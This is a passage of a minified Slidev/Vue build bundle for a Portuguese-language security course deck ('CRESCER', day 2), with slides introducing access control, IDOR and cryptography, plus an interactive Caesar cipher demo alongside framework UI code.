32 32",width:"1.2em",height:"1.2em"},x1=n("path",{fill:"currentColor",d:"M4 18v2h6.586L2 28.582L3.414 30L12 21.414V28h2V18H4zM30 3.416L28.592 2L20 10.586V4h-2v10h10v-2h-6.586L30 3.416z"},null,-1),w1=[x1];function E1(e,t){return _(),$("svg",b1,w1)}const A1={name:"carbon-minimize",render:E1},S1={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},k1=n("path",{fill:"currentColor",d:"m13 24l-9-9l1.414-1.414L13 21.171L26.586 7.586L28 9L13 24z"},null,-1),C1=[k1];function $1(e,t){return _(),$("svg",S1,C1)}const D1={name:"carbon-checkmark",render:$1},B1={class:"select-list"},F1={class:"title"},O1={class:"items"},I1=["onClick"],T1=Ae({__name:"SelectList",props:{modelValue:{type:[Object,String,Number]},title:{type:String},items:{type:Array}},setup(e,{emit:t}){const s=e;N(U);const o=Ht(s,"modelValue",t,{passive:!0});return(r,l)=>{const i=D1;return _(),$("div",B1,[n("div",F1,pn(e.title),1),n("div",O1,[(_(!0),$(Se,null,no(e.items,a=>(_(),$("div",{key:a.value,class:Pe(["item",{active:w(o)===a.value}]),onClick:()=>{var c;o.value=a.value,(c=a.onClick)==null||c.call(a)}},[C(i,{class:Pe(["text-green-500",{"opacity-0":w(o)!==a.value}])},null,8,["class"]),y(" "+pn(a.display||a.value),1)],10,I1))),128))])])}}});const Gl=(e,t)=>{const s=e.__vccOpts||e;for(const[o,r]of t)s[o]=r;return s},P1=Gl(T1,[["__scopeId","data-v-7dd0eaca"]]),M1={class:"text-sm"},L1=Ae({__name:"Settings",setup(e){N(U);const t=[{display:"Fit",value:0},{display:"1:1",value:1}];return(s,o)=>(_(),$("div",M1,[C(P1,{modelValue:w(wo),"onUpdate:modelValue":o[0]||(o[0]=r=>ke(wo)?wo.value=r:null),title:"Scale",items:t},null,8,["modelValue"])]))}}),R1={key:0,class:"rounded-md bg-main shadow absolute bottom-10 left-0 z-20","dark:border":"~ gray-400 opacity-10"},N1=Ae({__name:"MenuButton",props:{modelValue:{default:!1},disabled:{default:!1}},setup(e,{emit:t}){const s=e;N(U);const o=Ht(s,"modelValue",t,{passive:!0}),r=z();return Wh(r,()=>{o.value=!1}),(l,i)=>(_(),$("div",{ref_key:"el",ref:r,class:"flex relative"},[n("button",{class:Pe({disabled:e.disabled}),onClick:i[0]||(i[0]=a=>o.value=!w(o))},[Ut(l.$slots,"button",{class:Pe({disabled:e.disabled})})],2),(_(),Y(cu,null,[w(o)?(_(),$("div",R1,[Ut(l.$slots,"menu")])):he("v-if",!0)],1024))],512))}}),q1={class:"w-1px opacity-10 bg-current m-1 lg:m-2"},go={__name:"VerticalDivider",setup(e){return N(U),(t,s)=>(_(),$("div",q1))}},j1={render(){return[]}},H1={class:"icon-btn"},z1={class:"h-40px flex",p:"l-1 t-0.5 r-2",text:"sm leading-2"},V1={class:"my-auto"},U1={class:"opacity-50"},W1=Ae({__name:"NavControls",props:{persist:{default:!1}},setup(e){const t=e;N(U);const s=ol.smaller("md"),{isFullscreen:o,toggle:r}=ed,l=D(()=>ul.value?`?password=${ul.value}`:""),i=D(()=>`/presenter/${Ye.value}${l.value}`),a=D(()=>`/${Ye.value}${l.value}`),c=z(),u=()=>{c.value&&ns.value&&c.value.contains(ns.value)&&ns.value.blur()},d=D(()=>t.persist?"text-$slidev-controls-foreground bg-transparent":"rounded-md bg-main shadow dark:border dark:border-gray-400 dark:border-opacity-10"),p=Tt(),f=Tt();return fs(()=>import("./DrawingControls.a2d0ad9c.js"),["assets/DrawingControls.a2d0ad9c.js","assets/DrawingControls.vue_vue_type_script_setup_true_lang.805323b1.js"]).then(m=>f.value=m.default),(m,h)=>{const x=A1,b=_1,k=m1,S=c1,E=o1,B=Jv,L=Kv,P=ud,H=Nv,te=Iv,le=$v,ye=Bo("RouterLink"),_e=wv,ze=gv,Ve=dv,qe=rv;return _(),$("nav",{ref_key:"root",ref:c,class:"flex flex-col"},[n("div",{class:Pe(["flex flex-wrap-reverse text-xl gap-0.5 p-1 lg:gap-1 lg:p-2",w(d)]),onMouseleave:u},[w(Yt)?he("v-if",!0):(_(),$("button",{key:0,class:"icon-btn",onClick:h[0]||(h[0]=(...Ie)=>w(r)&&w(r)(...Ie))},[w(o)?(_(),Y(x,{key:0})):(_(),Y(b,{key:1}))])),n("button",{class:Pe(["icon-btn",{disabled:!w(_w)}]),onClick:h[1]||(h[1]=(...Ie)=>w(dn)&&w(dn)(...Ie))},[C(k)],2),n("button",{class:Pe(["icon-btn",{disabled:!w(vw)}]),title:"Next",onClick:h[2]||(h[2]=(...Ie)=>w(un)&&w(un)(...Ie))},[C(S)],2),w(Yt)?he("v-if",!0):(_(),$("button",{key:1,class:"icon-btn",title:"Slides overview",onClick:h[3]||(h[3]=Ie=>w(td)())},[C(E)])),w(al)?he("v-if",!0):(_(),$("button",{key:2,class:"icon-btn",title:"Toggle dark mode",onClick:h[4]||(h[4]=Ie=>w(id)())},[w(Kl)?(_(),Y(B,{key:0})):(_(),Y(L,{key:1}))])),C(go),w(Yt)?he("v-if",!0):(_(),$(Se,{key:3},[!w(jt)&&!w(s)&&w(p)?(_(),$(Se,{key:0},[C(w(p)),C(go)],64)):he("v-if",!0),w(jt)?(_(),$("button",{key:1,class:"icon-btn",title:"Show presenter cursor",onClick:h[5]||(h[5]=Ie=>xr.value=!w(xr))},[w(xr)?(_(),Y(P,{key:0})):(_(),Y(H,{key:1,class:"opacity-50"}))])):he("v-if",!0)],64)),!w(we).drawings.presenterOnly&&!w(Yt)?(_(),$(Se,{key:4},[n("button",{class:"icon-btn relative",title:"Drawing",onClick:h[6]||(h[6]=Ie=>zt.value=!w(zt))},[C(te),w(zt)?(_(),$("div",{key:0,class:"absolute left-1 right-1 bottom-0 h-0.7 rounded-full",style:Ze({background:w(Bn).color})},null,4)):he("v-if",!0)]),C(go)],64)):he("v-if",!0),w(Yt)?he("v-if",!0):(_(),$(Se,{key:5},[w(jt)?(_(),Y(ye,{key:0,to:w(a),class:"icon-btn",title:"Play Mode"},{default:X(()=>[C(le)]),_:1},8,["to"])):he("v-if",!0),w(hw)?(_(),Y(ye,{key:1,to:w(i),class:"icon-btn",title:"Presenter Mode"},{default:X(()=>[C(_e)]),_:1},8,["to"])):he("v-if",!0),he("v-if",!0)],64)),(_(),$(Se,{key:6},[w(we).download?(_(),$("button",{key:0,class:"icon-btn",onClick:h[8]||(h[8]=(...Ie)=>w(dl)&&w(dl)(...Ie))},[C(ze)])):he("v-if",!0)],64)),!w(jt)&&w(we).info&&!w(Yt)?(_(),$("button",{key:7,class:"icon-btn",onClick:h[9]||(h[9]=Ie=>Ps.value=!w(Ps))},[C(Ve)])):he("v-if",!0),!w(jt)&&!w(Yt)?(_(),Y(N1,{key:8},{button:X(()=>[n("button",H1,[C(qe)])]),menu:X(()=>[C(L1)]),_:1})):he("v-if",!0),w(Yt)?he("v-if",!0):(_(),Y(go,{key:9})),n("div",z1,[n("div",V1,[y(pn(w(Ye))+" ",1),n("span",U1,"/ "+pn(w(bd)),1)])]),C(w(j1))],34)],512)}}}),dd={render(){return[]}},pd={render(){return[]}},Y1={key:0,class:"absolute top-0 left-0 right-0 bottom-0 pointer-events-none text-xl"},K1=Ae({__name:"PresenterMouse",setup(e){return N(U),(t,s)=>{const o=ud;return w(gr).cursor?(_(),$("div",Y1,[C(o,{class:"absolute",style:Ze({left:`${w(gr).cursor.x}%`,top:`${w(gr).cursor.y}%`})},null,8,["style"])])):he("v-if",!0)}}}),X1=Ae({__name:"SlidesShow",props:{context:null},setup(e){N(U),me(gt,()=>{var s,o;((s=gt.value)==null?void 0:s.meta)&&gt.value.meta.preload!==!1&&(gt.value.meta.__preloaded=!0),((o=Er.value)==null?void 0:o.meta)&&Er.value.meta.preload!==!1&&(Er.value.meta.__preloaded=!0)},{immediate:!0});const t=Tt();return fs(()=>import("./DrawingLayer.2e648604.js"),[]).then(s=>t.value=s.default),(s,o)=>(_(),$(Se,null,[he(" Global Bottom "),C(w(pd)),he(" Slides "),(_(!0),$(Se,null,no(w(We),r=>{var l,i;return _(),$(Se,{key:r.path},[((l=r.meta)==null?void 0:l.__preloaded)||r===w(gt)?W((_(),Y(w(Zl),{key:0,is:r==null?void 0:r.component,clicks:r===w(gt)?w(It):0,"clicks-elements":((i=r.meta)==null?void 0:i.__clicksElements)||[],"clicks-disabled":!1,class:Pe(w(Ql)(r)),route:r,context:e.context},null,8,["is","clicks","clicks-elements","class","route","context"])),[[$u,r===w(gt)]]):he("v-if",!0)],64)}),128)),he(" Global Top "),C(w(dd)),w(t)?(_(),Y(w(t),{key:0})):he("v-if",!0),w(jt)?he("v-if",!0):(_(),Y(K1,{key:1}))],64))}}),Q1=Ae({__name:"Play",setup(e){N(U),Ty();const t=z();function s(l){var i;Na.value||((i=l.target)==null?void 0:i.id)==="slide-container"&&(l.screenX/window.innerWidth>.6?un():dn())}ww(t);const o=D(()=>Vg.value||Na.value);Tt();const r=Tt();return fs(()=>import("./DrawingControls.a2d0ad9c.js"),["assets/DrawingControls.a2d0ad9c.js","assets/DrawingControls.vue_vue_type_script_setup_true_lang.805323b1.js"]).then(l=>r.value=l.default),(l,i)=>(_(),$(Se,null,[n("div",{id:"page-root",ref_key:"root",ref:t,class:"grid grid-cols-[1fr_max-content]",style:Ze(w(Iu))},[C(cd,{class:"w-full h-full",style:Ze({background:"var(--slidev-slide-container-background, black)"}),width:w(ti)?w(Mn).width.value:void 0,scale:w(wo),onPointerdown:s},{default:X(()=>[C(X1,{context:"slide"})]),controls:X(()=>[n("div",{class:Pe(["absolute bottom-0 left-0 transition duration-300 opacity-0 hover:opacity-100",[w(o)?"opacity-100 right-0":"opacity-0 p-2",w(Ks)?"pointer-events-none":""]])},[C(W1,{class:"m-auto",persist:w(o)},null,8,["persist"])],2),!w(we).drawings.presenterOnly&&!w(Yt)&&w(r)?(_(),Y(w(r),{key:0,class:"ml-0"})):he("v-if",!0)]),_:1},8,["style","width","scale"]),he("v-if",!0)],4),C(ev)],64))}});function fd(e){const t=D(()=>e.value.path),s=D(()=>We.length-1),o=D(()=>parseInt(t.value.split(/\//g).slice(-1)[0])||1),r=D(()=>rr(o.value)),l=D(()=>We.find(f=>f.path===`${o.value}`)),i=D(()=>{var f,m,h;return(h=(m=(f=l.value)==null?void 0:f.meta)==null?void 0:m.slide)==null?void 0:h.id}),a=D(()=>{var f,m;return(m=(f=l.value)==null?void 0:f.meta)==null?void 0:m.layout}),c=D(()=>We.find(f=>f.path===`${Math.min(We.length,o.value+1)}`)),u=D(()=>We.filter(f=>{var m,h;return(h=(m=f.meta)==null?void 0:m.slide)==null?void 0:h.title}).reduce((f,m)=>(ni(f,m),f),[])),d=D(()=>si(u.value,l.value)),p=D(()=>oi(d.value));return{route:e,path:t,total:s,currentPage:o,currentPath:r,currentRoute:l,currentSlideId:i,currentLayout:a,nextRoute:c,rawTree:u,treeWithActiveStatuses:d,tree:p}}function md(e,t,s){const o=z(0);et(()=>{bt.afterEach(async()=>{await et(),o.value+=1})});const r=D(()=>{var c,u;return o.value,((u=(c=t.value)==null?void 0:c.meta)==null?void 0:u.__clicksElements)||[]}),l=D(()=>{var c,u,d;return+((d=(u=(c=t.value)==null?void 0:c.meta)==null?void 0:u.clicks)!=null?d:r.value.length)}),i=D(()=>s.value<We.length-1||e.value<l.value),a=D(()=>s.value>1||e.value>0);return{clicks:e,clicksElements:r,clicksTotal:l,hasNext:i,hasPrev:a}}const Z1=["id"],Qa=Ae({__name:"PrintSlideClick",props:{clicks:null,clicksElements:null,nav:null,route:null},emits:["update:clicksElements"],setup(e,{emit:t}){const s=e,o=Ht(s,"clicksElements",t),r=D(()=>({height:`${Ou}px`,width:`${Tn}px`})),l=Tt();fs(()=>import("./DrawingPreview.9332b86c.js"),[]).then(u=>l.value=u.default);const i=D(()=>s.clicks),a=md(i,s.nav.currentRoute,s.nav.currentPage),c=D(()=>`${s.route.path.toString().padStart(3,"0")}-${(i.value+1).toString().padStart(2,"0")}`);return yt(U,Me({nav:{...s.nav,...a},configs:we,themeConfigs:D(()=>we.themeConfig)})),(u,d)=>{var p;return _(),$("div",{id:w(c),class:"slide-container",style:Ze(w(r))},[C(w(pd)),C(w(Zl),{is:(p=e.route)==null?void 0:p.component,"clicks-elements":w(o),"onUpdate:clicks-elements":d[0]||(d[0]=f=>ke(o)?o.value=f:null),clicks:w(i),"clicks-disabled":!1,class:Pe(w(Ql)(e.route)),route:e.route},null,8,["is","clicks-elements","clicks","class","route"]),w(l)?(_(),Y(w(l),{key:0,page:+e.route.path},null,8,["page"])):he("v-if",!0),C(w(dd))],12,Z1)}}}),G1=Ae({__name:"PrintSlide",props:{route:null},setup(e){var l;const t=e;N(U);const s=Me(((l=t.route.meta)==null?void 0:l.__clicksElements)||[]),o=D(()=>t.route),r=fd(o);return(i,a)=>(_(),$(Se,null,[C(Qa,{"clicks-elements":s,"onUpdate:clicks-elements":a[0]||(a[0]=c=>ke(s)?s.value=c:null),clicks:0,nav:w(r),route:w(o)},null,8,["clicks-elements","nav","route"]),w(Ms)?he("v-if",!0):(_(!0),$(Se,{key:0},no(s.length,c=>(_(),Y(Qa,{key:c,clicks:c,nav:w(r),route:w(o)},null,8,["clicks","nav","route"]))),128))],64))}}),J1={id:"print-content"},e8=Ae({__name:"PrintContainer",props:{width:null},setup(e){const t=e;N(U);const s=D(()=>t.width),o=D(()=>t.width/cn),r=D(()=>s.value/o.value),l=D(()=>r.value<cn?s.value/Tn:o.value*cn/Tn),i=We.slice(0,-1),a=D(()=>({"select-none":!we.selectable,"slidev-code-line-numbers":we.lineNumbers}));return yt(Fu,l),(c,u)=>(_(),$("div",{id:"print-container",class:Pe(w(a))},[n("div",J1,[(_(!0),$(Se,null,no(w(i),d=>(_(),Y(G1,{key:d.path,route:d},null,8,["route"]))),128))]),Ut(c.$slots,"controls")],2))}});const t8=Ae({__name:"Print",setup(e){N(U);const t=Dn.canvasWidth,s=Math.round(t/Dn.aspectRatio)+1;function o(r,{slots:l}){if(l.default)return vt("style",l.default())}return to(()=>{ti?document.body.parentNode.classList.add("print"):document.body.parentNode.classList.remove("print")}),(r,l)=>(_(),$(Se,null,[C(o,null,{default:X(()=>[y(" @page { size: "+pn(w(t))+"px "+pn(s)+"px; margin: 0px; } ",1)]),_:1}),n("div",{id:"page-root",class:"grid grid-cols-[1fr_max-content]",style:Ze(w(Iu))},[C(e8,{class:"w-full h-full",style:Ze({background:"var(--slidev-slide-container-background, black)"}),width:w(Mn).width.value},null,8,["style","width"])],4)],64))}});const n8={class:"slidev-layout end"},s8={__name:"end",setup(e){return N(U),(t,s)=>(_(),$("div",n8," END "))}},o8=Gl(s8,[["__scopeId","data-v-ab32435f"]]),r8=["src","width","height"],Ne=Ae({__name:"Image",props:{src:{default:""},height:{default:void 0},width:{default:void 0},style:{default:void 0}},setup(e){const t=e;N(U);const s="../images/",o=s.includes("IMAGE_PATH_TO_USE")?"http://localhost:8000/":s;return(r,l)=>(_(),$("img",{alt:"",src:w(o)+t.src,width:t.width,height:t.height,style:Ze(t.style)},null,12,r8))}});function Za(e){return e.startsWith("/")?"/crescer/dia-2/"+e.slice(1):e}function l8(e,t=!1){const s=e&&["#","rgb","hsl"].some(r=>e.indexOf(r)===0),o={background:s?e:void 0,color:e&&!s?"white":void 0,backgroundImage:s?void 0:e?t?`linear-gradient(#0005, #0008), url(${Za(e)})`:`url("${Za(e)}")`:void 0,backgroundRepeat:"no-repeat",backgroundPosition:"center",backgroundSize:"cover"};return o.background||delete o.background,o}const i8={class:"my-auto w-full"},a8=Ae({__name:"cover",props:{background:{default:""}},setup(e){const t=e;N(U);const s=D(()=>l8(t.background,!0));return(o,r)=>(_(),$("div",{class:"slidev-layout cover",style:Ze(w(s))},[n("div",i8,[Ut(o.$slots,"default")])],4))}});const c8=n("h3",null,"CRESCER - M\xD3DULO DE SEGURAN\xC7A",-1),u8=n("h1",null,"DIA 2",-1),d8={class:"logo-cwi"},p8={__name:"1",setup(e){const t={theme:"default",highlighter:"shiki",lineNumbers:!0,info:`## Slidev Starter Template
Presentation slides for developers.

Learn more at [Sli.dev](https://sli.dev)
`,drawings:{persist:!1},css:"unocss",srcSequence:"./slides/1.presentation.md"};return N(U),(s,o)=>{const r=Ne;return _(),Y(a8,pe(de(t)),{default:X(()=>[c8,u8,n("div",d8,[C(r,{src:"/cwi-logo.png",height:"150",width:"150"},null,8,["src"])])]),_:1},16)}}},f8={class:"slidev-layout default"},Ce={__name:"default",setup(e){return N(U),(t,s)=>(_(),$("div",f8,[Ut(t.$slots,"default")]))}},m8=n("h1",null,"Abordagens",-1),h8=n("br",null,null,-1),g8=n("ul",null,[n("li",null,"Quebra de controle de acesso"),n("li",null,"IDOR"),n("li",null,"Criptografia"),n("li",null,"HTTP vs HTTPS"),n("li",null,"HASHES"),n("li",null,"XXE - XML External Entities"),n("li",null,"S3 - AWS"),n("li",null,"Firebase"),n("li",null,"Secrets")],-1),y8={__name:"2",setup(e){const t={srcSequence:"./slides/2.intro.md"};return N(U),(s,o)=>(_(),Y(Ce,pe(de(t)),{default:X(()=>[m8,h8,g8]),_:1},16))}},v8={class:"slidev-layout center h-full grid place-content-center"},_8={class:"my-auto"},gn={__name:"center",setup(e){return N(U),(t,s)=>(_(),$("div",v8,[n("div",_8,[Ut(t.$slots,"default")])]))}},b8=n("h1",null,"Quebra de Controle de Acesso",-1),x8={__name:"3",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/3.broken-access-control.md"};return N(U),(s,o)=>(_(),Y(gn,pe(de(t)),{default:X(()=>[b8]),_:1},16))}};const w8=n("h1",null,"O que \xE9 Controle de Acesso ?",-1),E8=n("p",null,"Um controle de quem pode acessar determinado recurso.",-1),A8={__name:"4",setup(e){const t={srcSequence:"./slides/4.broken-access-control.md"};return N(U),(s,o)=>{const r=Ne;return _(),Y(Ce,pe(de(t)),{default:X(()=>[w8,E8,n("div",null,[C(r,{src:"/broken-access-control-firewall.png",style:{margin:"0 auto","margin-top":"50px",width:"500px"}})])]),_:1},16)}}},S8=n("h1",null,"Quebra de controle de acesso",-1),k8=n("p",null,"Consegue acesso a um recurso n\xE3o autorizado burlando algum mecanismo de seguran\xE7a.",-1),C8={__name:"5",setup(e){const t={srcSequence:"./slides/5.broken-access-control.md"};return N(U),(s,o)=>{const r=Ne;return _(),Y(Ce,pe(de(t)),{default:X(()=>[S8,k8,n("div",null,[C(r,{src:"/broken-access-control.png",style:{margin:"0 auto","margin-top":"50px"}})])]),_:1},16)}}};const $8=n("h1",null,"Controle de Acesso",-1),D8=n("p",null,"Com o que devo me preocupar ?",-1),B8={grid:"~ cols-2"},F8={style:{"margin-left":"20px"}},O8=n("ul",null,[n("li",null,"Pode acessar a tela de listagem de usu\xE1rios?"),n("li",null,"Pode visualizar quais usu\xE1rios?"),n("li",null,"Pode visualizar quais informa\xE7\xF5es dos usu\xE1rios?"),n("li",null,"Pode editar, adicionar, remover, etc\u2026 ?")],-1),I8=[O8],T8={__name:"6",setup(e){const t={srcSequence:"./slides/6.broken-access-control.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[$8,D8,n("div",B8,[W(C(r,{src:"/product-list.png",style:{margin:"0 auto","border-radius":"10px"}},null,512),[[l]]),W((_(),$("div",F8,I8)),[[l]])])]),_:1},16)}}},P8=n("h1",null,"IDOR",-1),M8=n("p",null,"Refer\xEAncia de objeto direto inseguro (Insecure Direct Object Reference).",-1),L8=n("br",null,null,-1),R8={__name:"7",setup(e){const t={srcSequence:"./slides/7.idor.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[P8,M8,L8,W((_(),$("div",null,[C(r,{src:"idor-2.png",style:{"border-radius":"10px",margin:"0 auto"}})])),[[l]])]),_:1},16)}}},N8=n("h1",null,"Criptografia",-1),q8={__name:"8",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/10.cryptography.md"};return N(U),(s,o)=>(_(),Y(gn,pe(de(t)),{default:X(()=>[N8]),_:1},16))}};let j8=e=>crypto.getRandomValues(new Uint8Array(e)),H8=(e,t,s)=>{let o=(2<<Math.log(e.length-1)/Math.LN2)-1,r=-~(1.6*o*t/e.length);return(l=t)=>{let i="";for(;;){let a=s(r),c=r;for(;c--;)if(i+=e[a[c]&o]||"",i.length===l)return i}}},z8=(e,t=21)=>H8(e,t,j8);const V8=["width","height"],U8=["id"],W8=["fill"],Y8=["x1","y1","x2","y2","stroke","stroke-width","marker-end"],hs=Ae({__name:"Arrow",props:{x1:null,y1:null,x2:null,y2:null,width:null,color:null},setup(e){N(U);const s=z8("abcedfghijklmn",10)();return(o,r)=>(_(),$("svg",{class:"absolute left-0 top-0 pointer-events-none",width:Math.max(+e.x1,+e.x2)+50,height:Math.max(+e.y1,+e.y2)+50},[n("defs",null,[n("marker",{id:w(s),markerUnits:"strokeWidth",markerWidth:10,markerHeight:7,refX:"9",refY:"3.5",orient:"auto"},[n("polygon",{points:"0 0, 10 3.5, 0 7",fill:e.color||"currentColor"},null,8,W8)],8,U8)]),n("line",{x1:+e.x1,y1:+e.y1,x2:+e.x2,y2:+e.y2,stroke:e.color||"currentColor","stroke-width":e.width||2,"marker-end":`url(#${w(s)})`},null,8,Y8)],8,V8))}});const K8=n("h1",null,"O que \xE9 criptografia ?",-1),X8=n("p",null,"\xC9 uma \xE1rea da criptologia que estuda princ\xEDpios e t\xE9cnicas para comunica\xE7\xE3o segura na presen\xE7a de terceiros, ou seja, constru\xE7\xE3o e an\xE1lise de protocolos que impedem terceiros, ou o p\xFAblico, de lerem mensagens privadas.",-1),Q8={grid:"~ cols-3",style:{"margin-top":"50px"}},Z8=n("div",null,null,-1),G8=n("div",null,null,-1),J8={grid:"~ cols-3"},e_={class:"text-center"},t_=n("span",null,"Alice",-1),n_={style:{"margin-top":"10px"},class:"text-center"},s_=n("span",null,"???",-1),o_={class:"text-center"},r_=n("span",null,"Bob",-1),l_={__name:"9",setup(e){const t={srcSequence:"./slides/11.cryptography.md"};return N(U),(s,o)=>{const r=Ne,l=hs;return _(),Y(Ce,pe(de(t)),{default:X(()=>[K8,X8,n("div",Q8,[Z8,C(r,{src:"/hacker.png",style:"width:100px;height:100px;margin: 0 auto"},null,8,["src"]),G8]),n("div",J8,[n("div",e_,[C(r,{src:"/alice-icon.png",style:"width:100px;height:100px;margin: 0 auto",class:Pe("img-hor-vert")},null,8,["src"]),t_]),n("div",n_,[s_,C(r,{src:"/mail-letter-icon-blue.png",style:"width:80px;height:80px;margin: 0 auto"},null,8,["src"])]),n("div",o_,[C(r,{src:"/user-icon.png",style:"width:100px;height:100px;margin: 0 auto",class:Pe("img-hor-vert")},null,8,["src"]),r_])]),C(l,{x1:"250",y1:"360",x2:"430",y2:"360",color:"#4c4",width:"3",arrowSize:"1"}),C(l,{x1:"550",y1:"360",x2:"720",y2:"360",color:"#4c4",width:"3",arrowSize:"1"})]),_:1},16)}}};const i_={inject:{$slidev:{from:U}},data(){return{message:"",key:"",ciphered:""}},methods:{updateCiphered(e){this.message=this.message.toUpperCase().replace(/[^A-Z ]/g,"");const t=parseInt(this.key);if(isNaN(t)||t>25)return"";const s="ABCDEFGHIJKLMNOPQRSTUVWXYZ";let o="";for(let r of this.message){let l=s.indexOf(r);if(l===-1){o+=" ";continue}l=l+t,l>25&&(l=l-26),o+=s[l]}this.ciphered=o}}},a_=y(" Mensagem: "),c_={style:{"margin-top":"10px"}},u_=y(" Chave Num\xE9rica: "),d_=y(" Cifrado: "),p_={style:{color:"green"}},f_=em('<br><table class="alpha-table"><tbody><tr><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td><td>G</td><td>H</td><td>I</td><td>J</td><td>K</td><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr><tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td><td>26</td></tr></tbody></table>',2);function m_(e,t,s,o,r,l){return _(),$(Se,null,[n("div",null,[a_,W(n("input",{class:"input-text","onUpdate:modelValue":t[0]||(t[0]=i=>r.message=i),maxlength:"12"},null,512),[[Kr,r.message]])]),n("div",c_,[u_,W(n("input",{class:"input-text","onUpdate:modelValue":t[1]||(t[1]=i=>r.key=i),style:{width:"30px"},maxlength:"2"},null,512),[[Kr,r.key]])]),n("button",{style:{"font-size":"10px",border:"1px solid white",padding:"4px","border-radius":"4px",margin:"14px 0px"},onClick:t[2]||(t[2]=(...i)=>l.updateCiphered&&l.updateCiphered(...i))},"ATUALIZAR"),n("div",null,[d_,n("span",p_,pn(r.ciphered),1)]),f_],64)}const h_=Gl(i_,[["render",m_]]),g_=n("h1",null,"Cifras",-1),y_=n("p",null,"\xC9 uma t\xE9cnica onde o conte\xFAdo da mensagem \xE9 cifrado atrav\xE9s da mistura e/ou substitui\xE7\xE3o das letras da mensagem original. Para ter a mensagem original \xE9 necess\xE1rio fazer o processo inverso.",-1),v_={grid:"~ cols-2"},__=n("p",null,"Exemplos:",-1),b_=n("ul",null,[n("li",null,"Cifra de C\xE9sar"),n("li",null,"Cifra de Vigin\xE8re")],-1),x_={grid:"~ cols-2",style:{"margin-bottom":"10px"}},w_=n("span",null,"Cifra de C\xE9sar",-1),E_={__name:"10",setup(e){const t={srcSequence:"./slides/12.cryptography.md"};return N(U),(s,o)=>{const r=Ne,l=h_,i=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[g_,y_,n("div",v_,[W((_(),$("div",null,[__,b_,W(C(r,{src:"disco-de-cesar.jpg",width:"260",style:{margin:"0 auto","border-radius":"20px"}},null,512),[[i,3]])])),[[i,1]]),W((_(),$("div",null,[n("div",x_,[w_,C(r,{width:"60",src:"/julio-cesar.jpg",style:{"border-radius":"10px"}})]),C(l)])),[[i,2]])])]),_:1},16)}}},A_={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 256 256",width:"1.2em",height:"1.2em"},S_=n("path",{fill:"currentColor",d:"M200 32h-36.3a47.8 47.8 0 0 0-71.4 0H56a16 16 0 0 0-16 16v168a16 16 0 0 0 16 16h144a16 16 0 0 0 16-16V48a16 16 0 0 0-16-16Zm-72 0a32.1 32.1 0 0 1 32 32H96a32.1 32.1 0 0 1 32-32Zm72 184H56V48h26.8A47.2 47.2 0 0 0 80 64v8a8 8 0 0 0 8 8h80a8 8 0 0 0 8-8v-8a47.2 47.2 0 0 0-2.8-16H200Z"},null,-1),k_=[S_];function C_(e,t){return _(),$("svg",A_,k_)}const $_={name:"ph-clipboard",render:C_},D_={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 256 256",width:"1.2em",height:"1.2em"},B_=n("path",{fill:"currentColor",d:"M177.8 98.5a8 8 0 0 1-.3 11.3l-58.6 56a8.1 8.1 0 0 1-5.6 2.2a7.9 7.9 0 0 1-5.5-2.2l-29.3-28a8 8 0 1 1 11-11.6l23.8 22.7l53.2-50.7a8 8 0 0 1 11.3.3ZM232 128A104 104 0 1 1 128 24a104.2 104.2 0 0 1 104 104Zm-16 0a88 88 0 1 0-88 88a88.1 88.1 0 0 0 88-88Z"},null,-1),F_=[B_];function O_(e,t){return _(),$("svg",D_,F_)}const I_={name:"ph-check-circle",render:O_};/*! js-yaml 4.1.0 https://github.com/nodeca/js-yaml @license MIT */function hd(e){return typeof e>"u"||e===null}function T_(e){return typeof e=="object"&&e!==null}function P_(e){return Array.isArray(e)?e:hd(e)?[]:[e]}function M_(e,t){var s,o,r,l;if(t)for(l=Object.keys(t),s=0,o=l.length;s<o;s+=1)r=l[s],e[r]=t[r];return e}function L_(e,t){var s="",o;for(o=0;o<t;o+=1)s+=e;return s}function R_(e){return e===0&&Number.NEGATIVE_INFINITY===1/e}var N_=hd,q_=T_,j_=P_,H_=L_,z_=R_,V_=M_,Jl={isNothing:N_,isObject:q_,toArray:j_,repeat:H_,isNegativeZero:z_,extend:V_};function gd(e,t){var s="",o=e.reason||"(unknown reason)";return e.mark?(e.mark.name&&(s+='in "'+e.mark.name+'" '),s+="("+(e.mark.line+1)+":"+(e.mark.column+1)+")",!t&&e.mark.snippet&&(s+=`

`+e.mark.snippet),o+" "+s):o}function Qs(e,t){Error.call(this),this.name="YAMLException",this.reason=e,this.mark=t,this.message=gd(this,!1),Error.captureStackTrace?Error.captureStackTrace(this,this.constructor):this.stack=new Error().stack||""}Qs.prototype=Object.create(Error.prototype);Qs.prototype.constructor=Qs;Qs.prototype.toString=function(t){return this.name+": "+gd(this,t)};var Cn=Qs,U_=["kind","multi","resolve","construct","instanceOf","predicate","represent","representName","defaultStyle","styleAliases"],W_=["scalar","sequence","mapping"];function Y_(e){var t={};return e!==null&&Object.keys(e).forEach(function(s){e[s].forEach(function(o){t[String(o)]=s})}),t}function K_(e,t){if(t=t||{},Object.keys(t).forEach(function(s){if(U_.indexOf(s)===-1)throw new Cn('Unknown option "'+s+'" is met in definition of "'+e+'" YAML type.')}),this.options=t,this.tag=e,this.kind=t.kind||null,this.resolve=t.resolve||function(){return!0},this.construct=t.construct||function(s){return 